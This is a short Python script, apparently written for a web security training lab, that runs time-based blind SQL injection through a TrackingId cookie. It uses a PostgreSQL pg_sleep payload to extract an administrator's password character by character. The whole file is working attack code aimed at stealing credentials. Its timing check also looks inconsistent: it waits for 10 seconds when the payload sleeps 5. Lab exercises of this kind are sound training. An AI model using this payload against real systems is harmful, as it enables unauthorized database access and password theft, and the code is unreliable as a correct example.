import requests
import string

url="YOUR_LAB_URL"
password=""
chars = string.ascii_lowercase+string.digits
counter = 1
#sql_payload = "'||(SELECT+CASE+WHEN((select+substring(password,9,1)+from+users+where+username='administrator')='1')+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users)||'"

while True:
    for char in chars:
            r = requests.get(url, cookies={
                "TrackingId":f"YOUR_TRACKING_ID'||(SELECT+CASE+WHEN((select+substring(password,{counter},1)+from+users+where+username='administrator')='{char}')+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users)||'",
                "session":"YOUR_SESSION_ID"
            })
            if(int(r.elapsed.total_seconds()) >= 10): # Calculating the response time 
                password+=char
                counter+=1
                print(password)
    if(len(password) == 20):
        break
